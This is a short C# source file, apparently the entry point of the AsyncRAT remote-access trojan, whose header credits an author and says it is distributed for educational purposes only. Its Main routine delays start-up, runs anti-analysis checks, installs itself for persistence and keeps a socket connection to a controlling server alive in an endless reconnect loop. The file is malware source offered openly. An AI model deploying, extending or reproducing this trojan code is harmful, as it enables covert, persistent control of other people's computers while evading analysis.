﻿using System.Threading;
using Client.Sockets;
using Client.Install;
using System;
using Client.Helper;

//       │ Author     : NYAN CAT
//       │ Name       : AsyncRAT // Simple RAT

//       Contact Me   : https://github.com/NYAN-x-CAT

//       This program Is distributed for educational purposes only.


namespace Client
{
    class Program
    {


        static void Main()
        {
            Thread.Sleep(2500);
            if (!Methods.CreateMutex())
                Environment.Exit(0);

            if (Convert.ToBoolean(Settings.Anti))
                Anti_Analysis.RunAntiAnalysis();

            if (Convert.ToBoolean(Settings.Install))
                NormalStartup.Install();

            ClientSocket.InitializeClient();

            while (true)
            {
                if (!ClientSocket.IsConnected)
                    ClientSocket.Reconnect();
                Thread.Sleep(1500);
            }
        }
    }
}